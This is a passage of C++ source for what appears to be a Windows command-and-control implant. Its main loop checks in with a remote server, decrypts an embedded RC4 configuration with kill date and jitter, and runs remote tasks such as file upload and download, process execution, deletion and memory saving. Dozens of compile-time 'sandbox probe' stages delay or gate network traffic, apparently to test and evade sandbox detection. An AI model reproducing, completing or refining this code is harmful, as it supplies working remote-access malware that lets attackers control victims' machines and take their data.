		return successCode + 1006;

	CHAR headers[] = {
		'A','c','c','e','p','t',':',' ','*','/','*','\r','\n',
		'C','a','c','h','e','-','C','o','n','t','r','o','l',':',' ','n','o','-','c','a','c','h','e','\r','\n',
		0
	};
	return SandboxHttpSend8001((LPCSTR)probeConfig->profile.http_method, (LPCSTR)probeConfig->profile.uris[0], headers, NULL, 0, successCode);
}

// SandboxProfileHeadersNoBeat 使用 profile 的 header 名称/顺序，但不给真实 beat，只放低熵固定值。
static DWORD SandboxProfileHeadersNoBeat(DWORD successCode)
{
	AgentConfig* probeConfig = new AgentConfig();
	if (!probeConfig || !probeConfig->profile.uris || !probeConfig->profile.uri_count)
		return successCode + 1006;

	CHAR safeValue[] = { 's','a','f','e','-','p','r','o','b','e','\r','\n',0 };
	ULONG baseLen = probeConfig->profile.http_headers ? StrLenA((CHAR*)probeConfig->profile.http_headers) : 0;
	ULONG paramLen = probeConfig->profile.parameter ? StrLenA((CHAR*)probeConfig->profile.parameter) : 0;
	ULONG totalLen = baseLen + paramLen + 2 + 1 + StrLenA(safeValue) + 1;
	CHAR* headers = (CHAR*)MemAllocLocal(totalLen);
	if (!headers)
		return successCode + 1007;

	ULONG off = 0;
	if (baseLen) {
		memcpy(headers + off, probeConfig->profile.http_headers, baseLen);
		off += baseLen;
	}
	if (paramLen) {
		memcpy(headers + off, probeConfig->profile.parameter, paramLen);
		off += paramLen;
		headers[off++] = ':';
		headers[off++] = ' ';
		memcpy(headers + off, safeValue, StrLenA(safeValue));
		off += StrLenA(safeValue);
	}
	headers[off] = 0;

	DWORD ret = SandboxHttpSend8001((LPCSTR)probeConfig->profile.http_method, (LPCSTR)probeConfig->profile.uris[0], headers, NULL, 0, successCode);
	MemFreeLocal((LPVOID*)&headers, totalLen);
	return ret;
}

// AgentMain 是 Windows agent 的主入口，负责初始化、check-in、取任务、执行任务和回传结果。
DWORD WINAPI AgentMain(LPVOID lpParam)
{
	MemoryDiagLog("AGENTMAIN_ENTER");
#if DIRECT_HTTPS_SANDBOX_PROBE_STAGE == 54
	SandboxProbeSleepMs(DIRECT_HTTPS_DELAY_BEFORE_SEND_MS ? DIRECT_HTTPS_DELAY_BEFORE_SEND_MS : 120000);
	return 2054;
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 0
	::Sleep(10000);
	return 1300;
#endif

	BOOL apiLoaded = ApiLoad();
	MemoryDiagLog(apiLoaded ? "AGENTMAIN_APILOAD_OK" : "AGENTMAIN_APILOAD_FAIL");

#if DIRECT_HTTPS_PROBE_STAGE >= 70 && DIRECT_HTTPS_PROBE_STAGE <= 78
	return ProbeSleepReturn(ApiLoadProbeCode ? ApiLoadProbeCode : (apiLoaded ? 1379 : 1479));
#endif

	if (!apiLoaded)
		return 0;

#if DIRECT_HTTPS_SANDBOX_PROBE_STAGE == 55
	return SandboxLoadWininetNoSend(2055);
#endif

#if DIRECT_HTTPS_SANDBOX_PROBE_STAGE == 56
	SandboxProbeSleepMs(DIRECT_HTTPS_DELAY_BEFORE_SEND_MS ? DIRECT_HTTPS_DELAY_BEFORE_SEND_MS : 30000);
#if DIRECT_HTTPS_EXIT_BEFORE_SEND
	return 2056;
#else
	{
		CHAR headers[] = { 'A','c','c','e','p','t',':',' ','*','/','*','\r','\n',0 };
		return SandboxHttpSend8001("GET", "/", headers, NULL, 0, 2056);
	}
#endif
#endif

#if DIRECT_HTTPS_SANDBOX_PROBE_STAGE == 57
	SandboxProbeSleepMs(DIRECT_HTTPS_DELAY_BEFORE_SEND_MS ? DIRECT_HTTPS_DELAY_BEFORE_SEND_MS : 180000);
#if DIRECT_HTTPS_EXIT_BEFORE_SEND
	return 2057;
#else
	{
		CHAR headers[] = { 'A','c','c','e','p','t',':',' ','*','/','*','\r','\n',0 };
		return SandboxHttpSend8001("GET", "/", headers, NULL, 0, 2057);
	}
#endif
#endif

#if DIRECT_HTTPS_SANDBOX_PROBE_STAGE == 58
	if (!SandboxWaitForTriggerFile(DIRECT_HTTPS_DELAY_BEFORE_SEND_MS ? DIRECT_HTTPS_DELAY_BEFORE_SEND_MS : 180000))
		return 2058;
#if DIRECT_HTTPS_EXIT_BEFORE_SEND
	return 2158;
#else
	{
		CHAR headers[] = { 'A','c','c','e','p','t',':',' ','*','/','*','\r','\n',0 };
		return SandboxHttpSend8001("GET", "/", headers, NULL, 0, 2158);
	}
#endif
#endif

#if DIRECT_HTTPS_SANDBOX_PROBE_STAGE == 59
	{
		CHAR headers[] = { 'A','c','c','e','p','t',':',' ','*','/','*','\r','\n',0 };
		return SandboxHttpSend8001("GET", "/", headers, NULL, 0, 2059);
	}
#endif

#if DIRECT_HTTPS_SANDBOX_PROBE_STAGE == 60
	return SandboxProfileUriOnly(2060);
#endif

#if DIRECT_HTTPS_SANDBOX_PROBE_STAGE == 61
	return SandboxProfileHeadersNoBeat(2061);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 1
	return ProbeSleepReturn(1301);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 5
	g_Connector = CreateConnector();
	return ProbeSleepReturn(1305);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 7
	return ProbeWininetRequest(FALSE, 8000, "/", 1307);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 8
	return ProbeWininetRequest(TRUE, 8443, "/v13-connect-only", 1308);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 20
	g_Agent = new Agent();
	return ProbeSleepReturn(1320);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 30
	AgentInfo* probeInfo = new AgentInfo();
	return ProbeSleepReturn(probeInfo ? 1330 : 1430);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 31
	AgentConfig* probeConfig = new AgentConfig();
	return ProbeSleepReturn(probeConfig ? 1331 : 1431);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 32
	Commander* probeCommander = new Commander(NULL);
	return ProbeSleepReturn(probeCommander ? 1332 : 1432);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 33
	PBYTE probeSessionKey = (PBYTE)MemAllocLocal(16);
	if (!probeSessionKey)
		return 1433;
	for (int i = 0; i < 16; i++)
		probeSessionKey[i] = GenerateRandom32() % 0x100;
	return ProbeSleepReturn(1333);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 34
	AgentInfo* probeInfo = new AgentInfo();
	AgentConfig* probeConfig = new AgentConfig();
	Commander* probeCommander = new Commander(NULL);
	PBYTE probeSessionKey = (PBYTE)MemAllocLocal(16);
	if (!probeInfo || !probeConfig || !probeCommander || !probeSessionKey)
		return 1434;
	for (int i = 0; i < 16; i++)
		probeSessionKey[i] = GenerateRandom32() % 0x100;
	return ProbeSleepReturn(1334);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 36
	AgentConfig* probeConfig = new AgentConfig();
	g_Connector = CreateConnector();
	BYTE fakeBeat[32];
	for (int i = 0; i < 32; i++)
		fakeBeat[i] = (BYTE)(i + 1);
	if (!probeConfig || !g_Connector)
		return 1436;
	if (!g_Connector->SetProfile(&probeConfig->profile, fakeBeat, sizeof(fakeBeat)))
		return 1536;
	return ProbeSleepReturn(1336);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 37
	AgentConfig* probeConfig = new AgentConfig();
	g_Connector = CreateConnector();
	BYTE tinyBeat[1] = { 0 };
	if (!probeConfig || !g_Connector)
		return 1437;
	if (!g_Connector->SetProfile(&probeConfig->profile, tinyBeat, sizeof(tinyBeat)))
		return 1537;
	return ProbeSleepReturn(1337);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 38
	AgentConfig* probeConfig = new AgentConfig();
	g_Connector = CreateConnector();
	if (!probeConfig || !g_Connector)
		return 1438;
	return ProbeSleepReturn(1338);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 41
	void* probeCommanderMemory = Commander::operator new(sizeof(Commander));
	return ProbeSleepReturn(probeCommanderMemory ? 1341 : 1441);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 42
	Commander probeCommander(NULL);
	return ProbeSleepReturn(probeCommander.agent == NULL ? 1342 : 1442);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 43
	typedef void (Commander::*ProbeCommanderHandler)(ULONG, Packer*, Packer*);
	volatile ProbeCommanderHandler probeHandlers[] = {
		&Commander::CmdHello,
		&Commander::CmdCat,
		&Commander::CmdCd,
		&Commander::CmdCp,
		&Commander::CmdDisks,
		&Commander::CmdDownload,
		&Commander::CmdJobsKill,
		&Commander::CmdLs,
		&Commander::CmdMkdir,
		&Commander::CmdMv,
		&Commander::CmdPsRun,
		&Commander::CmdPwd,
		&Commander::CmdRm,
		&Commander::CmdTerminate,
		&Commander::CmdUpload,
		&Commander::CmdSaveMemory
	};
	return ProbeSleepReturn(probeHandlers[0] == NULL ? 1443 : 1343);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 50
	ULONG probeProfileSize = getProfileSize();
	return ProbeSleepReturn(probeProfileSize ? 1350 : 1450);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 51
	ULONG probeProfileSize = getProfileSize();
	CHAR* probeProfileBytes = (CHAR*)MemAllocLocal(probeProfileSize);
	if (!probeProfileBytes)
		return 1451;
	memcpy(probeProfileBytes, getProfile(), probeProfileSize);
	return ProbeSleepReturn(1351);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 52
	ULONG probeProfileSize = getProfileSize();
	CHAR* probeProfileBytes = (CHAR*)MemAllocLocal(probeProfileSize);
	if (!probeProfileBytes)
		return 1452;
	memcpy(probeProfileBytes, getProfile(), probeProfileSize);
	Packer* probePacker = new Packer((BYTE*)probeProfileBytes, probeProfileSize);
	ULONG probeCryptSize = probePacker->Unpack32();
	return ProbeSleepReturn(probeCryptSize ? 1352 : 1452);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 53
	ULONG probeProfileSize = getProfileSize();
	CHAR* probeProfileBytes = (CHAR*)MemAllocLocal(probeProfileSize);
	if (!probeProfileBytes)
		return 1453;
	memcpy(probeProfileBytes, getProfile(), probeProfileSize);
	Packer* probePacker = new Packer((BYTE*)probeProfileBytes, probeProfileSize);
	ULONG probeCryptSize = probePacker->Unpack32();
	PBYTE probeEncryptKey = (PBYTE)MemAllocLocal(16);
	if (!probeEncryptKey || !probeCryptSize)
		return 1453;
	memcpy(probeEncryptKey, probePacker->data() + 4 + probeCryptSize, 16);
	return ProbeSleepReturn(1353);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 54
	ULONG probeProfileSize = getProfileSize();
	CHAR* probeProfileBytes = (CHAR*)MemAllocLocal(probeProfileSize);
	if (!probeProfileBytes)
		return 1454;
	memcpy(probeProfileBytes, getProfile(), probeProfileSize);
	Packer* probePacker = new Packer((BYTE*)probeProfileBytes, probeProfileSize);
	ULONG probeCryptSize = probePacker->Unpack32();
	PBYTE probeEncryptKey = (PBYTE)MemAllocLocal(16);
	if (!probeEncryptKey || !probeCryptSize)
		return 1454;
	memcpy(probeEncryptKey, probePacker->data() + 4 + probeCryptSize, 16);
	DecryptRC4(probePacker->data() + 4, probeCryptSize, probeEncryptKey, 16);
	return ProbeSleepReturn(1354);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 55
	ULONG probeProfileSize = getProfileSize();
	CHAR* probeProfileBytes = (CHAR*)MemAllocLocal(probeProfileSize);
	if (!probeProfileBytes)
		return 1455;
	memcpy(probeProfileBytes, getProfile(), probeProfileSize);
	Packer* probePacker = new Packer((BYTE*)probeProfileBytes, probeProfileSize);
	ULONG probeCryptSize = probePacker->Unpack32();
	PBYTE probeEncryptKey = (PBYTE)MemAllocLocal(16);
	if (!probeEncryptKey || !probeCryptSize)
		return 1455;
	memcpy(probeEncryptKey, probePacker->data() + 4 + probeCryptSize, 16);
	DecryptRC4(probePacker->data() + 4, probeCryptSize, probeEncryptKey, 16);
	ULONG probeAgentType = probePacker->Unpack32();
	ULONG probeKillDate = probePacker->Unpack32();
	ULONG probeWorkingTime = probePacker->Unpack32();
	ULONG probeSleepDelay = probePacker->Unpack32();
	ULONG probeJitterDelay = probePacker->Unpack32();
	ULONG probeListenerType = probePacker->Unpack32();
	if (!probeAgentType && !probeKillDate && !probeWorkingTime && !probeSleepDelay && !probeJitterDelay && !probeListenerType)
		return 1455;
	return ProbeSleepReturn(1355);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 60
	void* probeRawMemory = MemAllocLocal(8);
	return ProbeSleepReturn(probeRawMemory ? 1360 : 1460);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 61
	void* probeRawMemory = MemAllocLocal(16);
	return ProbeSleepReturn(probeRawMemory ? 1361 : 1461);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 62
	void* probePackerMemory = Packer::operator new(sizeof(Packer));
	return ProbeSleepReturn(probePackerMemory ? 1362 : 1462);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 63
	void* probeCommanderMemory = Commander::operator new(sizeof(Commander));
	return ProbeSleepReturn(probeCommanderMemory ? 1363 : 1463);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 64
	ULONG probeProfileSize = getProfileSize();
	CHAR* probeProfileBytes = (CHAR*)MemAllocLocal(probeProfileSize);
	if (!probeProfileBytes)
		return 1464;
	memcpy(probeProfileBytes, getProfile(), probeProfileSize);
	Packer* probePacker = new Packer((BYTE*)probeProfileBytes, probeProfileSize);
	ULONG probeCryptSize = probePacker->Unpack32();
	PBYTE probeScratch = (PBYTE)MemAllocLocal(16);
	if (!probeScratch || !probeCryptSize)
		return 1464;
	memcpy(probeScratch, probePacker->data() + 4, 16);
	volatile BYTE probeFirst = probeScratch[0];
	return ProbeSleepReturn((probeFirst || probeCryptSize) ? 1364 : 1464);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 65
	ULONG probeProfileSize = getProfileSize();
	CHAR* probeProfileBytes = (CHAR*)MemAllocLocal(probeProfileSize);
	if (!probeProfileBytes)
		return 1465;
	memcpy(probeProfileBytes, getProfile(), probeProfileSize);
	Packer* probePacker = new Packer((BYTE*)probeProfileBytes, probeProfileSize);
	ULONG probeCryptSize = probePacker->Unpack32();
	if (!probeCryptSize)
		return 1465;
	volatile BYTE probeChecksum = 0;
	for (int i = 0; i < 16; i++)
		probeChecksum ^= probePacker->data()[4 + probeCryptSize + i];
	return ProbeSleepReturn((probeChecksum || probeCryptSize) ? 1365 : 1465);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 66
	ULONG probeProfileSize = getProfileSize();
	CHAR* probeProfileBytes = (CHAR*)MemAllocLocal(probeProfileSize);
	if (!probeProfileBytes)
		return 1466;
	memcpy(probeProfileBytes, getProfile(), probeProfileSize);
	Packer* probePacker = new Packer((BYTE*)probeProfileBytes, probeProfileSize);
	ULONG probeCryptSize = probePacker->Unpack32();
	PBYTE probeEncryptKey = (PBYTE)MemAllocLocal(16);
	if (!probeEncryptKey || !probeCryptSize)
		return 1466;
	for (int i = 0; i < 16; i++)
		probeEncryptKey[i] = probePacker->data()[4 + probeCryptSize + i];
	return ProbeSleepReturn(1366);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 21
	g_Agent = new Agent();
	ULONG probeBeatSize = 0;
	BYTE* probeBeat = g_Agent->BuildBeat(&probeBeatSize);
	if (probeBeat)
		MemFreeLocal((LPVOID*)&probeBeat, probeBeatSize);
	return ProbeSleepReturn(1321);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 22
	g_Agent = new Agent();
	g_Connector = CreateConnector();
	ULONG probeBeatSize = 0;
	BYTE* probeBeat = g_Agent->BuildBeat(&probeBeatSize);
	if (!g_Connector->SetProfile(&g_Agent->config->profile, probeBeat, probeBeatSize))
		return 1422;
	if (probeBeat)
		MemFreeLocal((LPVOID*)&probeBeat, probeBeatSize);
	return ProbeSleepReturn(1322);
#endif

	g_Agent = new Agent();
	g_Connector = CreateConnector();
	MemoryDiagLog("AGENT_OBJECTS_CREATED");

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);
	MemoryDiagLogU32("AGENT_BEAT_SIZE=", beatSize);

	if (!g_Connector->SetProfile(&g_Agent->config->profile, beat, beatSize)) {
		MemoryDiagLog("AGENT_SETPROFILE_FAIL");
		return 0;
	}
	MemoryDiagLog("AGENT_SETPROFILE_OK");

	MemFreeLocal((LPVOID*)&beat, beatSize);
	InitialCheckinDelay();


#if DIRECT_HTTPS_PROBE_STAGE == 80 || DIRECT_HTTPS_PROBE_STAGE == 82 || DIRECT_HTTPS_PROBE_STAGE == 85 || DIRECT_HTTPS_PROBE_STAGE == 90
	g_Agent = new Agent();
	g_Connector = CreateConnector();
	ULONG probeBeatSize = 0;
	BYTE* probeBeat = g_Agent->BuildBeat(&probeBeatSize);
	if (!g_Connector->SetProfile(&g_Agent->config->profile, probeBeat, probeBeatSize))
		return 1480;
	if (probeBeat)
		MemFreeLocal((LPVOID*)&probeBeat, probeBeatSize);
	DWORD probeResult = ((ConnectorHTTP*)g_Connector)->ProbeRequestStage(DIRECT_HTTPS_PROBE_STAGE, DIRECT_HTTPS_PROBE_STAGE == 85);
	g_Connector->CloseConnector();
	return ProbeSleepReturn(probeResult);
#endif

#if DIRECT_HTTPS_PROBE_STAGE == 10
	g_Connector->Exchange(nullptr, 0, g_Agent->SessionKey);
	g_Connector->RecvClear();
	g_Connector->CloseConnector();
	return ProbeSleepReturn(1310);
#endif

	Packer* packerOut = new Packer();
	InitResultEnvelope(packerOut, SELF_C2_RESULT_CODEC_COMPAT_BODY);
	ULONG fastFirstLoops = DIRECT_HTTPS_FAST_FIRST_LOOPS;
	MemoryDiagLog("AGENT_LOOP_READY");

	do {
		MemoryDiagLog("AGENT_OUTER_LOOP");
		if (!g_Connector->WaitForConnection()) {
			MemoryDiagLog("AGENT_WAIT_CONNECTION_FALSE");
			continue;
		}
		MemoryDiagLog("AGENT_WAIT_CONNECTION_TRUE");

		do {
			MemoryDiagLog("AGENT_INNER_LOOP");
			MemoryDiagLogU32("AGENT_OUT_DATASIZE_PRE=", packerOut->datasize());
			if (HasResultRecords(packerOut)) {
				TryRewriteCompatPayloadToNativeCodec(packerOut);
				FinalizeResultEnvelope(packerOut);
				MemoryDiagLog("AGENT_EXCHANGE_WITH_OUTPUT_BEGIN");
				g_Connector->Exchange(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey);
				MemoryDiagLog("AGENT_EXCHANGE_WITH_OUTPUT_END");
				packerOut->Clear(TRUE);
				InitResultEnvelope(packerOut, SELF_C2_RESULT_CODEC_COMPAT_BODY);
			}
			else {
				MemoryDiagLog("AGENT_EXCHANGE_EMPTY_BEGIN");
				g_Connector->Exchange(nullptr, 0, g_Agent->SessionKey);
				MemoryDiagLog("AGENT_EXCHANGE_EMPTY_END");
			}

			MemoryDiagLogU32("AGENT_RECV_SIZE=", (ULONG)g_Connector->RecvSize());
			if (g_Connector->RecvSize() > 0 && g_Connector->RecvData()) {
#if !DIRECT_HTTPS_HEARTBEAT_ONLY
				MemoryDiagLog("AGENT_PROCESS_TASKS_BEGIN");
				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
				MemoryDiagLog("AGENT_PROCESS_TASKS_END");
#endif
			}
			g_Connector->RecvClear();
			MemoryDiagLogU32("AGENT_OUT_DATASIZE_POST=", packerOut->datasize());

#if !DIRECT_HTTPS_CHECKIN_ONLY
			g_Agent->downloader->ProcessDownloader(packerOut);
			g_Agent->jober->ProcessJobs(packerOut);
#endif

			if (g_Agent->IsActive()) {
				const BOOL hasOutput = HasResultRecords(packerOut);
				MemoryDiagLogU32("AGENT_SLEEP_HAS_OUTPUT=", hasOutput ? 1 : 0);
				if (!hasOutput && fastFirstLoops > 0) {
					MemoryDiagLogU32("AGENT_FAST_FIRST_LOOP_SKIP_SLEEP_REMAIN=", fastFirstLoops);
					fastFirstLoops--;
					SandboxProbeSleepMs(100);
				}
				else {
					MemoryDiagLog("AGENT_SLEEP_BEGIN");
					g_Connector->Sleep(NULL, g_Agent->GetWorkingSleep(), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay, hasOutput);
					MemoryDiagLog("AGENT_SLEEP_END");
				}
			}
			else {
				MemoryDiagLog("AGENT_INACTIVE_AFTER_TASKS");
			}

		} while (g_Connector->IsConnected() && g_Agent->IsActive());

		if (!DIRECT_HTTPS_HEARTBEAT_ONLY && !DIRECT_HTTPS_HELLO_ONLY && !g_Agent->IsActive() && g_Connector->IsConnected()) {
			MemoryDiagLog("AGENT_EXIT_RESPONSE_BEGIN");
			g_Agent->commander->Exit(packerOut);
			FinalizeResultEnvelope(packerOut);
			g_Connector->Exchange(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey);
			g_Connector->RecvClear();
			MemoryDiagLog("AGENT_EXIT_RESPONSE_END");
		}

		g_Connector->Disconnect();
		MemoryDiagLog("AGENT_DISCONNECT");

	} while (g_Agent->IsActive());

	MemoryDiagLog("AGENT_LOOP_EXIT");
	packerOut->Clear(FALSE);
	delete packerOut;

	g_Connector->CloseConnector();
	MemoryDiagLog("AGENT_CLOSE_CONNECTOR");
	AgentExit(g_Agent->config->exit_method);
	MemoryDiagLog("AGENTMAIN_RETURN");
	return 0;
}

// AgentExit 根据退出方式调用线程退出或进程退出。
void AgentExit(const int method)
{
	MemoryDiagLogU32("AGENTEXIT_METHOD=", (ULONG)method);
#if DIRECT_HTTPS_SKIP_UNUSED_API_INIT
	// “未用 API 不初始化”实验模式：
	// 当前 exe 入口会在 AgentMain 返回后自然退出，不强制调用 ntdll 的
	// RtlExitUserThread/RtlExitUserProcess。这样 ApiLoad() 可以完全跳过
	// ntdll 退出 API 解析，验证老师说的“用不到就不初始化”方向。
	(void)method;
	return;
#else
	if (method == 1)
		ApiNt->RtlExitUserThread(STATUS_SUCCESS);
	else if (method == 2)
		ApiNt->RtlExitUserProcess(STATUS_SUCCESS);
#endif
}
